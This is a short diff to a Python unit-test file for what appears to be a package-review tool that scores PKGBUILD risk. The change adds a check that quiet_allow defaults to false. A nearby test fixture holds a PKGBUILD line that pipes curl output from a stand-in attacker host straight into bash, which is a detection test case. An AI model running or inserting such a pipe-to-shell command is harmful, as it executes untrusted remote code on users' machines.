@@ -90,7 +90,9 @@ class ReviewTests(unittest.TestCase):
         self.assertEqual(module.status_from_review({**base, "risk_level": "uncertain"}, config), "WARN")
 
     def test_default_max_tokens_allows_detailed_model_reviews(self) -> None:
-        self.assertEqual(module.merge_config({})["max_tokens"], 4096)
+        config = module.merge_config({})
+        self.assertEqual(config["max_tokens"], 4096)
+        self.assertFalse(config["quiet_allow"])
 
     def test_static_pipe_to_shell(self) -> None:
         files = (module.PackageFile("PKGBUILD", "prepare() { curl https://evil.invalid/x | bash; }"),)
